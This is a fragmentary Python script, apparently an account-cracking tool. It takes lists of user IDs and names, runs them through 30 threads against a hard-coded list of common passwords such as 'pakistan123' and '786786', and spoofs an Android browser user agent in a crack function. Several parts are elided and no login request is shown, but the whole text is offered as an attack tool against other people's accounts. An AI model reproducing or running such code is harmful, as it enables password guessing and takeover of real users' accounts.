...
def otomatis():
	...
	with tred(max_workers=30) as babas:
		for akun in id:
			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
			depan = nama.split(" ")[0]
			pwx = ['pakistan','pakistan1','pakistan123','pakistan12345','pakistan786','pakistan1234','786786','pakistan12','112233']
			if len(nama)<=5:
				if len(depan)<=1 or len(depan)<=2:
					pass 
				else:
...
def crack(idf,pwx,url,awal):
	...
	for pw in pwx:
		try:
			...
			else:ua= "Mozilla/5.0 (Linux; Android 9; SM-N950U Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36"
